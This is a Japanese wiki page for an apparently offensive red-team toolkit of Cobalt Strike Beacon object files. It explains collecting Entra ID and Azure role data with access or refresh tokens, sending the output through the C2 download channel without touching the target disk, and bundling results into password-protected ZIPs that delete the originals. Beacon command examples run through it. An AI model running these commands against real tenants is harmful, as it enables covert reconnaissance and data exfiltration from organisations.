# Beacon のダウンロードとアーカイブ

[English](../Downloads-and-Archives.md) | [日本語](Downloads-and-Archives.md)
[Wiki の目次](Home.md) | [実行手順](../../README.ja.md)

<a id="download-mode-diskless-operation"></a>
## ダウンロードモード

`bark.cna` のロード時は **ON が既定**です。`*_bh` の出力を C2 ダウンロードチャネルに送り、対象ディスクに書き込まず teamserver の Downloads から取得できます。

```text
beacon> bark_download_mode on
beacon> bark_get_entra_users_bh <token>
[+] Downloaded AZUser_20250621_143022.json (28410 bytes)
```

対象側ファイルが必要な場合やパスワード付き ZIP の一時ステージングでは `bark_download_mode off` にします。

| コマンド | 用途 |
| --- | --- |
| `bark_download_mode on\|off` | BH BOF 全体の出力先切り替え。既定は on |
| `bark_clear_role_downloads` | ロール割り当てダウンロードのキャッシュを消去 |

<a id="diskless-graph-conversion"></a>
## ディスクレスのグラフ変換

`bark_convert_az_role_assignments_to_graph_bh` は通常、対象ディスクのロール割り当て JSON を読み取ります。download mode が ON の場合、CNA は完了した ARM ロール割り当てダウンロードの teamserver パスを保持します。ARM / all-info はそれらをバイナリ blob にまとめ、ARM 処理の終了待ち後に変換をキューへ追加します。BOF はメモリ内で処理します。単独の変換コマンドも使用できます。

```text
beacon> bark_download_mode on
beacon> bark_get_azurerm_info_bh <arm_token>
[*] processing 5 in-memory segment(s)
[+] Downloaded AZRoleGraph_20250621_143500.json (12840 bytes)
[+] Downloaded AZNativeRBAC_20250621_143500.json (9412 bytes)
```

`AZNativeRBAC_*.json` は AzureHound のネイティブ取り込みが対応する Owner / Contributor / User Access Administrator 系などの RBAC レコードです。`AZRoleGraph_*.json` はカスタムロールやネイティブ種類のない組み込みロールも含め、有効な割り当てを `BARK_*` 関係で表します。

ARM umbrella は開始時にキャッシュを初期化します。`bark_clear_role_downloads` は途中結果を手動で破棄する場合に使用します。

<a id="password-protected-zip-collection"></a>
## パスワード付き ZIP

`bark_zip_collect` はカレントディレクトリの `AZ*.json` を1つのパスワード付き ZIP にまとめ、**元の JSON を削除**します。

umbrella の末尾にパスワードを渡すと最後のサブ BOF の終了後に ZIP 化します。先に download mode を OFF にします。ON のまま渡したパスワードは警告付きで無視され、ディスクレス動作を維持します。

```text
beacon> bark_download_mode off
beacon> bark_get_entra_info_bh   <msgraph_token> MyStrongPassword!
beacon> bark_get_azurerm_info_bh <arm_token>     MyStrongPassword!
beacon> bark_get_all_info_bh_rt  <tenantId> <refreshToken> MyStrongPassword!
```

中間 JSON は download mode OFF のときに対象ディスクへ保存します。最終 ZIP は常に `BeaconDownload()` で送信し、平文 JSON を削除します。大きな ZIP はメモリ内で 256 KiB に分割します。全パート完了後はローカルの自動再結合または手動再結合を使用します。`.part` を直接 `unzip` や `bark_decrypt.py` に渡さないでください。

```bash
base=bark_collect_20260724_093845.zip
cat "$base".part??? > "${base%.zip}_reassembled.zip"
zipinfo -t "${base%.zip}_reassembled.zip"
python3 bark_decrypt.py \
  "${base%.zip}_reassembled.zip" \
  'MyStrongPassword!' \
  ./extracted
```

個別 BOF の後にも ZIP 化できます。

```text
beacon> bark_download_mode off
beacon> bark_get_entra_users_bh  <token>
beacon> bark_get_entra_groups_bh <token>
beacon> bark_zip_collect MyStrongPassword!
```

ZIP は PKWARE ZipCrypto、圧縮方式は STORE です。対応する unzip、7-Zip、Windows Explorer などで展開できます。

```bash
zipinfo -t bark_collect_20250520_123456.zip
unzip -P MyStrongPassword! bark_collect_20250520_123456.zip
7z x -pMyStrongPassword! bark_collect_20250520_123456.zip
python3 bark_decrypt.py bark_collect_20250520_123456.zip MyStrongPassword!
python3 bark_decrypt.py --batch MyStrongPassword!
python3 bark_decrypt.py --batch MyStrongPassword! --merge bloodhound.json
```

`--batch` はカレントディレクトリの `*.json.zip` を処理し、`--merge` は1つの BH envelope に統合します。最終アップロードには[分類済みバンドル](BloodHound-Import.md)を使用します。

ZipCrypto は互換性重視の古い暗号方式です。強い機密保護が必要な保管・転送では、ローカルで 7-Zip の AES-256 や `gpg -c` を使用します。
